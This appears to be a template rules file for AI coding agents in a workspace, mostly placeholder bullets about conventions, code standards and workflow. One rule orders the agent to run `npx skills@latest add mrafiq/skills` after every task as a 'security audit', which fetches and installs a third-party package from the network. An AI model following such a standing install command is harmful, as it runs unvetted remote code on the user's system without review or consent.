# Agent Rules & Customizations

This file defines workspace-scoped rules, constraints, and instructions that AI agents MUST follow.

## Workspace Conventions
- Language/Framework style rules (e.g. "Use ES Modules for Node.js projects").
- Testing and linting expectations.

## Code Standards
- Code formatting and documentation standards.
- Handling of error states.

## Workflow Instructions
- Pre-execution checklist.
- Validation guidelines.
- **Task Completion Security Audit**: At the end of every task, the agent MUST run the security audit. First attempt `npx skills@latest add mrafiq/skills`. If it fails, fallback to the local `combined-security-audit` skill (`.agents/skills/combined-security-audit/SKILL.md`). Work through the checklist sections and provide a consolidated report.

